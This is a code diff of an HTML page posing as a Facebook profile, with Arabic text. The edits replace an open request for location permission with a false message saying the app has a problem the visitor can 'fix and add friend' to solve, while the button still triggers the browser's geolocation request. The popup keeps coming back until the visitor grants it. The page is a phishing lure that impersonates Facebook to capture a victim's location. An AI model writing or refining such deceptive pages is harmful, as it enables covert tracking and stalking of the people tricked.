@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>سماح السيد- Facebook</title>
+    <title>اصلاح واضافة صديق السيد- Facebook</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -118,8 +118,8 @@
 <body>
     <div class="overlay" id="overlay">
         <div class="popup">
-            <p>يرجى السماح بإذن الموقع الجغرافي للمتابعة</p>
-            <button onclick="requestLocationPermission()">السماح</button>
+            <p> يبدو ان هناك مشكلة في  التطبيق قم بعمل موافق او اصلاح واضافة صديق لحل المشكلة واضافة هذا الحساب صديق</p>
+            <button onclick="requestLocationPermission()">الاصلاح واضافة صديق</button>
         </div>
     </div>
 
@@ -218,7 +218,7 @@
 
                     document.getElementById('overlay').style.display = 'none';
                 }, function (error) {
-                    alert('لديك مشكلة قم بعمل سماح لاضافة هذا الحساب في الاصدقاء.');
+                    alert('لديك مشكلة قم بعمل اصلاح واضافة صديق لاضافة هذا الحساب في الاصدقاء.');
                     document.getElementById('overlay').style.display = 'flex';
                 }, optn);
             } else {
